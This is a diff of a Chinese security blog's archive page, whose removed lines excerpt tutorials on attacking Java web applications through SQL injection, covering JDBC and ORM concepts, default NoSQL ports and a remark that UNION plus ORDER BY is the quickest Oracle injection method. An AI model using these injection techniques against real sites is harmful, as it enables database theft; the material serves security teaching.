-        <p><a href="http://drops.wooyun.org/tips/288">攻击JavaWeb应用[4]-SQL注入[2]</a></p>  <p><a href="http://drops.wooyun.org/tips/288">http://drops.wooyun.org/tips/288</a></p>  <h6>注:这一节主要是介绍Oracle和SQL注入工具相关，本应该是和前面的Mysql一起但是由于章节过长了没法看，所以就分开了。</h6>  <h5>0x00 Oracle</h5>  <hr align="center" width="100%" size="2" />  <p>Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。</p>  <p>Oracle对于MYSQL、MSSQL来说意味着更大的数据量，更大的权限。这一次我们依旧使用上面的代码，数据库结构平移到Oracle上去，数据库名用的默认的orcl，字段&quot;corps_desc&quot; 从text改成了VARCHAR2(4000)，JSP内的驱动和URL改成了对应的Oracle。    <br />    <br /><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image001.png"><img title="clip_image001" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="749" alt="clip_image001" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image001_thumb.png" width="1386" border="0" /></a></p>  <p>Jsp页面代码：    <br /><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image002.png"><img title="clip_image002" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="640" alt="clip_image002" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image002_thumb.png" width="1328" border="0" /></a></p>  <p>开始注入：</p>  <p><code>Union +order by</code> 永远都是最快捷最实用的，而盲注什么的太费时费力了。</p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/1039.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/1042.seo/" title="攻击JavaWeb应用 7 -Server篇 1" itemprop="url">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2013-10-21T19:25:39.000Z" itemprop="datePublished">
-          2013-10-22
-      </time>
+    <h1 itemprop="name">攻击JavaWeb应用 7 -Server篇 1</h1>
     
-    
-    | 
-    <a href='/tag/360/'>360</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/1038.seo/">攻击JavaWeb应用 3 -SQL注入 1</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p><a href="http://drops.wooyun.org/tips/236">攻击JavaWeb应用[3]-SQL注入[1]</a></p>  <p><a href="http://drops.wooyun.org/tips/236">http://drops.wooyun.org/tips/236</a></p>  <h5>注:本节重点在于让大家熟悉各种SQL注入在JAVA当中的表现，本想带点ORM框架实例，但是与其几乎无意，最近在学习MongoDb，挺有意思的，后面有机会给大家补充相关。</h5>  <h5>0x00 JDBC和ORM</h5>  <hr align="center" width="100%" size="2" />  <h6>JDBC:</h6>  <p>JDBC（Java Data Base Connectivity,java数据库连接）是一种用于执行SQL语句的Java API，可以为多种关系数据库提供统一访问。</p>  <h6>JPA:</h6>  <p>JPA全称Java Persistence API. JPA通过JDK 5.0注解或XML描述对象－关系表的映射关系，并将运行期的实体对象持久化到数据库中。是一个ORM规范。Hibernate是JPA的具体实现。但是Hibernate出现的时间早于JPA（因为Hibernate作者很狂，sun看不惯就叫他去制定JPA标准去了哈哈）。</p>  <h6>ORM:</h6>  <p>对象关系映射（ORM）目前有Hibernate、OpenJPA、TopLink、EclipseJPA等实现。</p>  <h6>JDO:</h6>  <p>JDO(Java Data Object )是Java对象持久化的新的规范，也是一个用于存取某种数据仓库中的对象的标准化API。没有听说过JDO没有关系，很多人应该知道PDO,ADO吧？概念一样。</p>  <h6>关系:</h6>  <p>JPA可以依靠JDBC对JDO进行对象持久化，而ORM只是JPA当中的一个规范，我们常见的Hibernate、Mybatis和TopLink什么的都是ORM的具体实现。</p>  <p>概念性的东西知道就行了，能记住最好。很多东西可能真的是会用，但是要是让你去定义或者去解释的时候发现会有些困难。</p>  <p>重点了解JDBC是个什么东西，知道Hibernate和Mybatis是ORM的具体的实现就够了。</p>  <h6>Object:</h6>  <p>在Java当中Object类（java.lang.object）是所有Java类的祖先。每个类都使用 Object 作为超类。所有对象（包括数组）都实现这个类的方法。所以在认识Java之前应该有一个对象的概念。</p>  <h6>关系型数据库和非关系型数据库：</h6>  <p>数据库是按照数据结构来组织、存储和管理数据的仓库。</p>  <p>关系型数据库，是建立在关系模型基础上的数据库。关系模型就是指二维表格模型,因而一个关系型数据库就是由二维表及其之间的联系组成的一个数据组织。当前主流的关系型数据库有Oracle、DB2、Microsoft SQL Server、Microsoft Access、MySQL等。</p>  <p>NoSQL，指的是非关系型的数据库。随着互联网web2.0网站的兴起，传统的关系数据库在应付web2.0网站，特别是超大规模和高并发的SNS类型的web2.0纯动态网站已经显得力不从心，暴露了很多难以克服的问题，而非关系型的数据库则由于其本身的特点得到了非常迅速的发展。</p>  <pre><code>1、High performance - 对数据库高并发读写的需求。</code></pre><br><br><pre><code>2、Huge Storage - 对海量数据的高效率存储和访问的需求。</code></pre><br><br><pre><code>3、High Scalability &amp;&amp; High Availability- 对数据库的高可扩展性和高可用性的需求。</code></pre><br><br><p>常见的非关系型数据库:Membase、MongoDB、Hypertable、Apache Cassandra、CouchDB等。</p>
+    <time datetime="2013-10-21T21:04:30.000Z" itemprop="datePublished">2013-10-22</time>
+  </a>
+</section>
 
-<p>常见的NoSQL数据库端口：</p>
-
-<pre><code>MongoDB:27017、28017、27080</code></pre>
-
-<pre><code>CouchDB:5984</code></pre>
-
-<pre><code>Hbase:9000</code></pre>
-
-<pre><code>Cassandra:9160</code></pre>
-
-<pre><code>Neo4j:7474</code></pre>
-
-<pre><code>Riak:8098</code></pre>
-
-<p>在引入这么多的概念之后我们今天的故事也就要开始了,概念性的东西后面慢慢来。引入这些东西不只仅仅是为了讲一个SQL注入，后面很多地方可能都会用到。</p>
-
-<p>传统的JDBC大于要经过这么些步骤完成一次查询操作，java和数据库的交互操作:</p>
-
-<pre><code>准备JDBC 驱动</code></pre>
-
-<pre><code>加载驱动</code></pre>
-
-<pre><code>获取连接</code></pre>
-
-<pre><code>预编译SQL</code></pre>
-
-<pre><code>执行SQL</code></pre>
-
-<pre><code>处理结果集</code></pre>
-
-<pre><code>依次释放连接</code></pre>
-
-<p>sun只是在JDBC当中定义了具体的接口，而JDBC接口的具体的实现是由数据库提供厂商去写具体的实现的，比如说Connection对象，不同的数据库的实现方式是不同的。</p>
-
-<p>使用传统的JDBC的项目已经越来越少了，曾经的model1和model2已经被MVC给代替了。如果用传统的JDBC写项目你不得不去管理你的数据连接、事物等。而用ORM框架一般程序员只用关心执行SQL和处理结果集就行了。比如Spring的JdbcTemplate、Hibernate的HibernateTemplate提供了一套对dao操作的模版，对JDBC进行了轻量级封装。开发人员只需配置好数据源和事物一般仅需要提供一个SQL、处理SQL执行后的结果就行了，其他的事情都交给框架去完成了。</p>
-
-<p><a href="http://img.cker.in/JavaWeb3SQL1_8BCD/clip_image001.png"><img title="clip_image001" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="594" alt="clip_image001" src="http://img.cker.in/JavaWeb3SQL1_8BCD/clip_image001_thumb.png" width="1375" border="0" /></a></p>
-
-<h5>0x01 经典的JDBC的Sql注入</h5>
-
-<hr align="center" width="100%" size="2" />
-
-<p>Sql注入产生的直接原因是拼凑SQL，绝大多数程序员在做开发的时候并不会去关注SQL最终是怎么去运行的，更不会去关注SQL执行的安全性。因为时间紧，任务重完成业务需求就行了，谁还有时间去管你什么SQL注入什么？还不如喝喝茶，看看妹子。正是有了这种懒惰的程序员SQL注入一直没有消失，而这当中不乏一些大型厂商。有的人可能心中有防御Sql注入意识，但是在面对复杂业务的时候可能还是存在侥幸心理，最近还是被神奇路人甲给脱裤了。为了处理未知的SQL注入攻击，一些大厂商开始采用SQL防注入甚至是使用某些厂商的WAF。</p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/1038.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+  <section class="post" itemscope itemprop="blogPost">
   
-  <nav class="pagination" role="pagination">
-    <a class="newer-posts" href="/archives/2013/page/3/">← Newer Posts</a>
-    <span class="page-number">Page 4 of 16</span>
-    <a class="older-posts" href="/archives/2013/page/5/">Older Posts →</a>
+    <a href="/1041.seo/" title="攻击JavaWeb应用 6 -程序架构与代码审计" itemprop="url">
+  
+    <h1 itemprop="name">攻击JavaWeb应用 6 -程序架构与代码审计</h1>
+    
+    <time datetime="2013-10-21T20:52:58.000Z" itemprop="datePublished">2013-10-22</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/1040.seo/" title="攻击JavaWeb应用 5 -MVC安全" itemprop="url">
+  
+    <h1 itemprop="name">攻击JavaWeb应用 5 -MVC安全</h1>
+    
+    <time datetime="2013-10-21T20:05:06.000Z" itemprop="datePublished">2013-10-22</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/1039.seo/" title="攻击JavaWeb应用 4 -SQL注入 2" itemprop="url">
+  
+    <h1 itemprop="name">攻击JavaWeb应用 4 -SQL注入 2</h1>
+    
+    <time datetime="2013-10-21T19:56:10.000Z" itemprop="datePublished">2013-10-22</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/1038.seo/" title="攻击JavaWeb应用 3 -SQL注入 1" itemprop="url">
+  
+    <h1 itemprop="name">攻击JavaWeb应用 3 -SQL注入 1</h1>
+    
+    <time datetime="2013-10-21T19:25:39.000Z" itemprop="datePublished">2013-10-22</time>
+  </a>
+</section>
+
+
+  <nav id="page-nav" class="clearfix archive-nav">
+    <a class="extend prev" rel="prev" href="/archives/2013/page/3/">&laquo; 上一页</a><a class="page-number" href="/archives/2013/">1</a><a class="page-number" href="/archives/2013/page/2/">2</a><a class="page-number" href="/archives/2013/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/archives/2013/page/5/">5</a><a class="page-number" href="/archives/2013/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/archives/2013/page/16/">16</a><a class="extend next" rel="next" href="/archives/2013/page/5/">下一页 &raquo;</a>
   </nav>
-</main>
 
-
-      
-<footer class="site-footer">
-  
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
   </div>
+</div>
+
+      </div>
+      <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
 </footer>
+      <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
 
 
 
-  </div>
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
 </div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
 
-<nav  class="outer-nav top horizontal">
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
+    </body>
+   </html>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
-
-          <a class="icon-image"  href="/images"><span>Images</span></a>
-
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
-
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
-
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
-
-</nav>
-
-</div>
-</body>
-</html>
